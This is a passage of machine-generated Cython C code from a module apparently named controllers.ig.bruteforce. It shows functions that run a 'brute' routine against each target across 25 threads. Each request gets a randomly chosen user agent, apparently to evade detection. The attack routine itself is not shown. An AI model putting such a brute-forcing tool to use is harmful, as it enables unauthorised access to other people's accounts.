            if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 100, __pyx_L7_error) }
            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_brute); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 100, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 100, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GIVEREF(__pyx_t_2);
            PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_2);
            __Pyx_INCREF(__pyx_v_target);
            __Pyx_GIVEREF(__pyx_v_target);
            PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_v_target);
            __pyx_t_2 = 0;
            if (unlikely(__pyx_v_kwargs == Py_None)) {
              PyErr_SetString(PyExc_TypeError, "argument after ** must be a mapping, not NoneType");
              __PYX_ERR(0, 100, __pyx_L7_error)
            }
            if (likely(PyDict_CheckExact(__pyx_v_kwargs))) {
              __pyx_t_2 = PyDict_Copy(__pyx_v_kwargs); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 100, __pyx_L7_error)
              __Pyx_GOTREF(__pyx_t_2);
            } else {
              __pyx_t_2 = PyObject_CallFunctionObjArgs((PyObject*)&PyDict_Type, __pyx_v_kwargs, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 100, __pyx_L7_error)
              __Pyx_GOTREF(__pyx_t_2);
            }
            __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 100, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

             
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

           
        }
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        goto __pyx_L12_try_end;
        __pyx_L7_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          {
          __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.start.normal", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_11, &__pyx_t_2) < 0) __PYX_ERR(0, 98, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_5 = PyTuple_Pack(3, __pyx_t_1, __pyx_t_11, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 98, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_5, NULL);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 98, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          if (__pyx_t_13 < 0) __PYX_ERR(0, 98, __pyx_L9_except_error)
          __pyx_t_14 = ((!(__pyx_t_13 != 0)) != 0);
          if (__pyx_t_14) {
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_11);
            __Pyx_XGIVEREF(__pyx_t_2);
            __Pyx_ErrRestoreWithState(__pyx_t_1, __pyx_t_11, __pyx_t_2);
            __pyx_t_1 = 0; __pyx_t_11 = 0; __pyx_t_2 = 0; 
            __PYX_ERR(0, 98, __pyx_L9_except_error)
          }
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L8_exception_handled;
        }
        __pyx_L9_except_error:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
        goto __pyx_L1_error;
        __pyx_L8_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
        __pyx_L12_try_end:;
      }
    }
      {
       {
        if (__pyx_t_4) {
          __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__3, NULL);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 98, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        }
        goto __pyx_L6;
      }
      __pyx_L6:;
    }
    goto __pyx_L18;
    __pyx_L3_error:;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    goto __pyx_L1_error;
    __pyx_L18:;
  }

   

   
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.start.normal", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_pool);
  __Pyx_XDECREF(__pyx_v_target);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

 

 
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5start_5randoms(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds);  
static PyMethodDef __pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_5start_5randoms = {"randoms", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5start_5randoms, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5start_5randoms(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_data = 0;
  PyObject *__pyx_v_kwargs = 0;
  PyObject *__pyx_v_task = 0;
  PyObject *__pyx_v_status = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("randoms (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_data,&__pyx_n_s_kwargs,&__pyx_n_s_task,&__pyx_n_s_status,0};
    PyObject* values[4] = {0,0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  4: values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
        CYTHON_FALLTHROUGH;
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_data)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_kwargs)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("randoms", 1, 4, 4, 1); __PYX_ERR(0, 102, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_task)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("randoms", 1, 4, 4, 2); __PYX_ERR(0, 102, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  3:
        if (likely((values[3] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_status)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("randoms", 1, 4, 4, 3); __PYX_ERR(0, 102, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "randoms") < 0)) __PYX_ERR(0, 102, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 4) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
      values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
    }
    __pyx_v_data = values[0];
    __pyx_v_kwargs = values[1];
    __pyx_v_task = values[2];
    __pyx_v_status = values[3];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("randoms", 1, 4, 4, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 102, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.start.randoms", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_5start_4randoms(__pyx_self, __pyx_v_data, __pyx_v_kwargs, __pyx_v_task, __pyx_v_status);

   
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_5start_4randoms(PyObject *__pyx_self, PyObject *__pyx_v_data, PyObject *__pyx_v_kwargs, PyObject *__pyx_v_task, PyObject *__pyx_v_status) {
  struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *__pyx_cur_scope;
  struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *__pyx_outer_scope;
  PyObject *__pyx_v_ualist = NULL;
  PyObject *__pyx_v_pool = NULL;
  PyObject *__pyx_v_item = NULL;
  PyObject *__pyx_v_target = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  Py_ssize_t __pyx_t_9;
  PyObject *(*__pyx_t_10)(PyObject *);
  Py_ssize_t __pyx_t_11;
  PyObject *(*__pyx_t_12)(PyObject *);
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  int __pyx_t_16;
  int __pyx_t_17;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("randoms", 0);
  __pyx_outer_scope = (struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *) __Pyx_CyFunction_GetClosure(__pyx_self);
  __pyx_cur_scope = __pyx_outer_scope;

   
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_app); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_LIST_USER_AGENT); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_u_web); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_ualist = __pyx_t_1;
  __pyx_t_1 = 0;

   
  if (unlikely(PyObject_SetItem(__pyx_v_kwargs, __pyx_n_u_task, __pyx_v_task) < 0)) __PYX_ERR(0, 104, __pyx_L1_error)

   
  if (unlikely(PyObject_SetItem(__pyx_v_kwargs, __pyx_n_u_progress, __pyx_v_status) < 0)) __PYX_ERR(0, 105, __pyx_L1_error)

   
    {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 106, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 106, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_max_workers, __pyx_int_25) < 0) __PYX_ERR(0, 106, __pyx_L1_error)
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 106, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_exit); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 106, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 106, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 106, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __pyx_t_2;
    __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_8);
          {
          __pyx_v_pool = __pyx_t_1;
          __pyx_t_1 = 0;

           
          if (likely(PyList_CheckExact(__pyx_v_data)) || PyTuple_CheckExact(__pyx_v_data)) {
            __pyx_t_1 = __pyx_v_data; __Pyx_INCREF(__pyx_t_1); __pyx_t_9 = 0;
            __pyx_t_10 = NULL;
          } else {
            __pyx_t_9 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_data); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 107, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_10 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 107, __pyx_L7_error)
          }
          for (;;) {
            if (likely(!__pyx_t_10)) {
              if (likely(PyList_CheckExact(__pyx_t_1))) {
                if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_1)) break;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_3 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_9); __Pyx_INCREF(__pyx_t_3); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 107, __pyx_L7_error)
                #else
                __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 107, __pyx_L7_error)
                __Pyx_GOTREF(__pyx_t_3);
                #endif
              } else {
                if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_9); __Pyx_INCREF(__pyx_t_3); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 107, __pyx_L7_error)
                #else
                __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 107, __pyx_L7_error)
                __Pyx_GOTREF(__pyx_t_3);
                #endif
              }
            } else {
              __pyx_t_3 = __pyx_t_10(__pyx_t_1);
              if (unlikely(!__pyx_t_3)) {
                PyObject* exc_type = PyErr_Occurred();
                if (exc_type) {
                  if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                  else __PYX_ERR(0, 107, __pyx_L7_error)
                }
                break;
              }
              __Pyx_GOTREF(__pyx_t_3);
            }
            __Pyx_XDECREF_SET(__pyx_v_item, __pyx_t_3);
            __pyx_t_3 = 0;

             
            __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 108, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 108, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __pyx_t_2 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
              __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_5);
              if (likely(__pyx_t_2)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                __Pyx_INCREF(__pyx_t_2);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_5, function);
              }
            }
            __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_2, __pyx_v_ualist) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_ualist);
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 108, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(PyObject_SetItem(__pyx_v_kwargs, __pyx_n_u_user_agent, __pyx_t_3) < 0)) __PYX_ERR(0, 108, __pyx_L7_error)
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

             
            if (likely(PyList_CheckExact(__pyx_v_item)) || PyTuple_CheckExact(__pyx_v_item)) {
              __pyx_t_3 = __pyx_v_item; __Pyx_INCREF(__pyx_t_3); __pyx_t_11 = 0;
              __pyx_t_12 = NULL;
            } else {
              __pyx_t_11 = -1; __pyx_t_3 = PyObject_GetIter(__pyx_v_item); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 109, __pyx_L7_error)
              __Pyx_GOTREF(__pyx_t_3);
              __pyx_t_12 = Py_TYPE(__pyx_t_3)->tp_iternext; if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 109, __pyx_L7_error)
            }
            for (;;) {
              if (likely(!__pyx_t_12)) {
                if (likely(PyList_CheckExact(__pyx_t_3))) {
                  if (__pyx_t_11 >= PyList_GET_SIZE(__pyx_t_3)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_5 = PyList_GET_ITEM(__pyx_t_3, __pyx_t_11); __Pyx_INCREF(__pyx_t_5); __pyx_t_11++; if (unlikely(0 < 0)) __PYX_ERR(0, 109, __pyx_L7_error)
                  #else
                  __pyx_t_5 = PySequence_ITEM(__pyx_t_3, __pyx_t_11); __pyx_t_11++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 109, __pyx_L7_error)
                  __Pyx_GOTREF(__pyx_t_5);
                  #endif
                } else {
                  if (__pyx_t_11 >= PyTuple_GET_SIZE(__pyx_t_3)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_3, __pyx_t_11); __Pyx_INCREF(__pyx_t_5); __pyx_t_11++; if (unlikely(0 < 0)) __PYX_ERR(0, 109, __pyx_L7_error)
                  #else
                  __pyx_t_5 = PySequence_ITEM(__pyx_t_3, __pyx_t_11); __pyx_t_11++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 109, __pyx_L7_error)
                  __Pyx_GOTREF(__pyx_t_5);
                  #endif
                }
              } else {
                __pyx_t_5 = __pyx_t_12(__pyx_t_3);
                if (unlikely(!__pyx_t_5)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 109, __pyx_L7_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_5);
              }
              __Pyx_XDECREF_SET(__pyx_v_target, __pyx_t_5);
              __pyx_t_5 = 0;

               
              __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_pool, __pyx_n_s_submit); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 110, __pyx_L7_error)
              __Pyx_GOTREF(__pyx_t_5);
              if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 110, __pyx_L7_error) }
              __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_brute); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 110, __pyx_L7_error)
              __Pyx_GOTREF(__pyx_t_2);
              __pyx_t_13 = PyTuple_New(2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 110, __pyx_L7_error)
              __Pyx_GOTREF(__pyx_t_13);
              __Pyx_GIVEREF(__pyx_t_2);
              PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_t_2);
              __Pyx_INCREF(__pyx_v_target);
              __Pyx_GIVEREF(__pyx_v_target);
              PyTuple_SET_ITEM(__pyx_t_13, 1, __pyx_v_target);
              __pyx_t_2 = 0;
              if (unlikely(__pyx_v_kwargs == Py_None)) {
                PyErr_SetString(PyExc_TypeError, "argument after ** must be a mapping, not NoneType");
                __PYX_ERR(0, 110, __pyx_L7_error)
              }
              if (likely(PyDict_CheckExact(__pyx_v_kwargs))) {
                __pyx_t_2 = PyDict_Copy(__pyx_v_kwargs); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 110, __pyx_L7_error)
                __Pyx_GOTREF(__pyx_t_2);
              } else {
                __pyx_t_2 = PyObject_CallFunctionObjArgs((PyObject*)&PyDict_Type, __pyx_v_kwargs, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 110, __pyx_L7_error)
                __Pyx_GOTREF(__pyx_t_2);
              }
              __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_13, __pyx_t_2); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 110, __pyx_L7_error)
              __Pyx_GOTREF(__pyx_t_14);
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

               
            }
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

             
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

           
        }
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        goto __pyx_L12_try_end;
        __pyx_L7_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          {
          __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.start.randoms", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_3, &__pyx_t_14) < 0) __PYX_ERR(0, 106, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_2 = PyTuple_Pack(3, __pyx_t_1, __pyx_t_3, __pyx_t_14); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 106, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_15 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_2, NULL);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 106, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_15);
          __pyx_t_16 = __Pyx_PyObject_IsTrue(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          if (__pyx_t_16 < 0) __PYX_ERR(0, 106, __pyx_L9_except_error)
          __pyx_t_17 = ((!(__pyx_t_16 != 0)) != 0);
          if (__pyx_t_17) {
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_3);
            __Pyx_XGIVEREF(__pyx_t_14);
            __Pyx_ErrRestoreWithState(__pyx_t_1, __pyx_t_3, __pyx_t_14);
            __pyx_t_1 = 0; __pyx_t_3 = 0; __pyx_t_14 = 0; 
            __PYX_ERR(0, 106, __pyx_L9_except_error)
          }
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L8_exception_handled;
        }
        __pyx_L9_except_error:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
        goto __pyx_L1_error;
        __pyx_L8_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
        __pyx_L12_try_end:;
      }
    }
      {
       {
        if (__pyx_t_4) {
